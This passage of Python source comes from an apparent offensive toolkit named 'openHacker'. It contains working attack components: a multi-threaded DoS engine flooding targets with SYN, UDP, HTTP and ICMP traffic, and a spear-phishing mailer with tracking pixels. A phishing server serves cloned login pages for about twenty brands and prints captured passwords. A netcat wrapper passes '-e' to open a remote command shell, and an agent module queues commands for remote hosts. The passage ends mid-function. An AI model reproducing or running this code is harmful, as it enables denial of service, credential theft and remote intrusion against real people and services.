    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "openHacker"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "openHacker"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "openHacker"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_available_scan_types(self) -> List[str]:
        return ["full", "ssl", "cgi", "sql", "xss"]

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
        
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "openHacker"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# SPEAR PHISHING ENGINE
# =====================
class SpearPhishingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_campaign(self, name: str, template: str, subject: str, from_email: str,
                       targets: List[Dict], scheduled_time: str = None) -> SpearPhishingCampaign:
        campaign = SpearPhishingCampaign(
            id=str(uuid.uuid4())[:8],
            name=name,
            template=template,
            subject=subject,
            from_email=from_email,
            targets=targets,
            scheduled_time=scheduled_time,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_spear_phishing_campaign(campaign)
        return campaign
    
    def send_campaign(self, campaign_id: str) -> Dict:
        campaigns = self.db.get_spear_phishing_campaigns()
        campaign_data = next((c for c in campaigns if c['id'] == campaign_id), None)
        if not campaign_data:
            return {'success': False, 'error': 'Campaign not found'}
        
        smtp_server = self.config.get('spear_phishing.smtp_server', '')
        smtp_port = self.config.get('spear_phishing.smtp_port', 587)
        smtp_username = self.config.get('spear_phishing.smtp_username', '')
        smtp_password = self.config.get('spear_phishing.smtp_password', '')
        
        if not smtp_server:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        sent_count = 0
        targets = json.loads(campaign_data['targets']) if campaign_data['targets'] else []
        
        for target in targets:
            try:
                msg = email.message.EmailMessage()
                msg['Subject'] = campaign_data['subject']
                msg['From'] = campaign_data['from_email']
                msg['To'] = target.get('email', '')
                
                template = campaign_data['template']
                for key, value in target.items():
                    template = template.replace(f"{{{{{key}}}}}", str(value))
                
                tracking_url = f"{self.config.get('spear_phishing.tracking_server', 'http://localhost:5000')}/track/{campaign_id}/{target.get('email', '')}"
                template += f'\n<img src="{tracking_url}" width="1" height="1">'
                
                if '<html' in template.lower():
                    msg.set_content(template, subtype='html')
                else:
                    msg.set_content(template)
                
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.starttls()
                    server.login(smtp_username, smtp_password)
                    server.send_message(msg)
                
                sent_count += 1
            except Exception as e:
                print(f"Failed to send to {target.get('email', 'unknown')}: {e}")
        
        self.db.conn.execute(
            "UPDATE spear_phishing_campaigns SET sent_count = ?, status = 'sent' WHERE id = ?",
            (sent_count, campaign_id)
        )
        self.db.conn.commit()
        
        return {
            'success': True,
            'campaign_id': campaign_id,
            'sent_count': sent_count,
            'total_targets': len(targets)
        }
    
    def track_open(self, campaign_id: str, target_email: str, tracking_id: str = None):
        self.db.track_email_open(campaign_id, target_email)
    
    def track_click(self, campaign_id: str, target_email: str):
        self.db.track_email_click(campaign_id, target_email)
    
    def get_campaigns(self) -> List[Dict]:
        return self.db.get_spear_phishing_campaigns()

# =====================
# AGENT ENGINE
# =====================
class AgentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.heartbeat_timer = None
    
    def register_agent(self, name: str, ip_address: str) -> Dict:
        agent_id = str(uuid.uuid4())[:8]
        self.db.register_agent(agent_id, name, ip_address)
        return {
            'success': True,
            'agent_id': agent_id,
            'name': name,
            'ip_address': ip_address,
            'message': f'Agent {name} registered'
        }
    
    def send_command(self, agent_id: str, command: str) -> bool:
        return self.db.add_agent_command(agent_id, command)
    
    def poll_commands(self, agent_id: str) -> List[Dict]:
        return self.db.get_pending_agent_commands(agent_id)
    
    def submit_result(self, command_id: int, result: str, status: str = "completed"):
        self.db.update_agent_command_result(command_id, result, status)
    
    def start_heartbeat(self):
        def heartbeat():
            agents = self.db.get_agents()
            for agent in agents:
                self.db.update_agent_heartbeat(agent['id'])
            
            if self.heartbeat_timer:
                self.heartbeat_timer.cancel()
            
            interval = self.config.get('agent.heartbeat_interval', 30)
            self.heartbeat_timer = threading.Timer(interval, heartbeat)
            self.heartbeat_timer.daemon = True
            self.heartbeat_timer.start()
        
        heartbeat()
    
    def stop_heartbeat(self):
        if self.heartbeat_timer:
            self.heartbeat_timer.cancel()
            self.heartbeat_timer = None
    
    def get_agents(self) -> List[Dict]:
        return self.db.get_agents()
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        return self.db.get_agent(agent_id)

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.packet_count = 0
        self.interface = config.get('network_monitor.interface', 'eth0')
        self.promiscuous = config.get('network_monitor.promiscuous', False)
        self.capture_limit = config.get('network_monitor.packet_capture_limit', 1000)
    
    def start(self):
        self.running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        print(f"{Colors.SUCCESS}✅ Network monitor started on {self.interface}{Colors.RESET}")
    
    def stop(self):
        self.running = False
    
    def _monitor_loop(self):
        while self.running:
            try:
                if SCAPY_AVAILABLE:
                    self._scapy_monitor()
                else:
                    self._socket_monitor()
            except Exception as e:
                logger.error(f"Network monitor error: {e}")
                time.sleep(5)
    
    def _scapy_monitor(self):
        from scapy.all import sniff
        sniff(iface=self.interface, prn=self._process_packet, store=0,
              promisc=self.promiscuous, count=self.capture_limit)
    
    def _socket_monitor(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        sock.bind((self.interface, 0))
        sock.settimeout(1)
        
        while self.running:
            try:
                data, addr = sock.recvfrom(65535)
                self._process_packet(data)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Socket monitor error: {e}")
                break
        
        sock.close()
    
    def _process_packet(self, packet):
        self.packet_count += 1
        
        try:
            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
                if packet.haslayer(IP):
                    ip = packet[IP]
                    src_ip = ip.src
                    dst_ip = ip.dst
                    protocol = ip.proto
                    size = len(packet)
                    
                    src_port = 0
                    dst_port = 0
                    payload = ""
                    
                    if packet.haslayer(TCP):
                        src_port = packet[TCP].sport
                        dst_port = packet[TCP].dport
                        protocol = "TCP"
                    elif packet.haslayer(UDP):
                        src_port = packet[UDP].sport
                        dst_port = packet[UDP].dport
                        protocol = "UDP"
                    elif packet.haslayer(ICMP):
                        protocol = "ICMP"
                    
                    self.db.save_network_packet(src_ip, dst_ip, src_port, dst_port, protocol, size, str(packet))
            else:
                self.db.save_network_packet("unknown", "unknown", 0, 0, "unknown", len(packet), "")
        except Exception as e:
            logger.error(f"Packet processing error: {e}")
    
    def get_packets(self, limit: int = 100) -> List[Dict]:
        return self.db.get_network_packets(limit)
    
    def get_statistics(self) -> Dict:
        packets = self.db.get_network_packets(1000)
        stats = {
            'total_packets': len(packets),
            'protocols': Counter(),
            'top_sources': Counter(),
            'top_dests': Counter()
        }
        
        for p in packets:
            stats['protocols'][p.get('protocol', 'unknown')] += 1
            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
            stats['top_dests'][p.get('dest_ip', 'unknown')] += 1
        
        return stats

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        if self.server_instance and self.server_instance.html_content:
            self.wfile.write(self.server_instance.html_content.encode())
        
        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
            self.server_instance.db.conn.execute(
                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
                (self.server_instance.link_id,)
            )
            self.server_instance.db.conn.commit()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        
        templates = {
            'facebook': self._get_template("facebook", "#1877f2", "Facebook"),
            'instagram': self._get_template("instagram", "#0095f6", "Instagram"),
            'twitter': self._get_template("twitter", "#1d9bf0", "X / Twitter"),
            'gmail': self._get_template("gmail", "#1a73e8", "Gmail"),
            'linkedin': self._get_template("linkedin", "#0a66c2", "LinkedIn"),
            'microsoft': self._get_template("microsoft", "#0078d4", "Microsoft"),
            'google': self._get_template("google", "#4285f4", "Google"),
            'apple': self._get_template("apple", "#0071e3", "Apple"),
            'paypal': self._get_template("paypal", "#0070ba", "PayPal"),
            'amazon': self._get_template("amazon", "#ff9900", "Amazon"),
            'netflix': self._get_template("netflix", "#e50914", "NETFLIX"),
            'spotify': self._get_template("spotify", "#1ed760", "Spotify"),
            'whatsapp': self._get_template("whatsapp", "#25d366", "WhatsApp"),
            'telegram': self._get_template("telegram", "#2aabee", "Telegram"),
            'discord': self._get_template("discord", "#5865f2", "Discord"),
            'github': self._get_template("github", "#24292f", "GitHub"),
            'slack': self._get_template("slack", "#611f69", "Slack"),
            'office365': self._get_template("office365", "#0078d4", "Office 365"),
            'icloud': self._get_template("icloud", "#0071e3", "iCloud"),
            'steam': self._get_template("steam", "#67c1f5", "Steam"),
        }
        
        html = templates.get(platform, self._custom_template())
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_server(self):
        self.phishing_server.stop()
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def _get_template(self, name: str, color: str, display_name: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:'Courier New',monospace;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:#000;border:2px solid #fff;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,255,255,0.3)}}
.logo{{color:#fff;font-size:32px;text-align:center;margin-bottom:30px;letter-spacing:4px}}
input{{width:100%;padding:14px;margin:10px 0;background:#000;border:2px solid #fff;box-sizing:border-box;color:#fff;font-family:'Courier New',monospace}}
input:focus{{outline:none;border-color:#fff;box-shadow:0 0 15px rgba(255,255,255,0.5)}}
button{{width:100%;padding:14px;background:#fff;color:#000;border:none;font-size:20px;cursor:pointer;font-weight:bold;font-family:'Courier New',monospace;letter-spacing:2px}}
button:hover{{background:#000;color:#fff;border:2px solid #fff}}
.warning{{margin-top:20px;padding:10px;background:rgba(255,0,0,0.2);color:#ff6b6b;text-align:center;font-size:12px;border:1px solid #ff6b6b}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">[ {display_name} ]</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _custom_template(self):
        return """<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:'Courier New',monospace;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{background:#000;border:2px solid #fff;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,255,255,0.3)}
.logo{text-align:center;margin-bottom:30px;color:#fff;font-size:28px;font-weight:bold;letter-spacing:6px}
input{width:100%;padding:14px;margin:10px 0;background:#000;border:2px solid #fff;color:#fff;box-sizing:border-box;font-family:'Courier New',monospace}
input:focus{outline:none;border-color:#fff;box-shadow:0 0 15px rgba(255,255,255,0.5)}
button{width:100%;padding:14px;background:#fff;color:#000;border:none;cursor:pointer;font-weight:bold;font-size:16px;font-family:'Courier New',monospace;letter-spacing:2px}
button:hover{background:#000;color:#fff;border:2px solid #fff}
.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.2);border:1px solid #ff6b6b;color:#ff6b6b;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">OPENHACKER</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">SECURE LOGIN</button></form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', target]
            elif scan_type == "service":
                cmd = ['nmap', '-sV', target]
            elif scan_type == "os":
                cmd = ['nmap', '-O', target]
            elif scan_type == "vulnerability":
                cmd = ['nmap', '--script', 'vuln', target]
            elif scan_type == "stealth":
                cmd = ['nmap', '-sS', '-T2', target]
            elif scan_type == "udp":
                cmd = ['nmap', '-sU', target]
            else:
                cmd = ['nmap', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['wget', '-q', url]
            if output:
                cmd.extend(['-O', output])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=openHacker_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=openHacker_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    import dns.reversename
                    import dns.resolver
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    import dns.resolver
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None
    
    @staticmethod
    def get_mac_vendor(mac: str) -> Optional[str]:
        try:
            mac = mac.upper().replace('-', ':').replace('.', ':')
            prefix = mac[:8].replace(':', '')
            
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None

# =====================
# DOMAIN HOSTING ENGINE
# =====================
class DomainHostingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.hosted_domains = {}
        self.domain_to_ip = {}
    
    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
        try:
            domain = self.db.resolve_ip(ip)
            if domain:
                return domain
            
            try:
                if DNS_AVAILABLE:
                    import dns.reversename
                    import dns.resolver
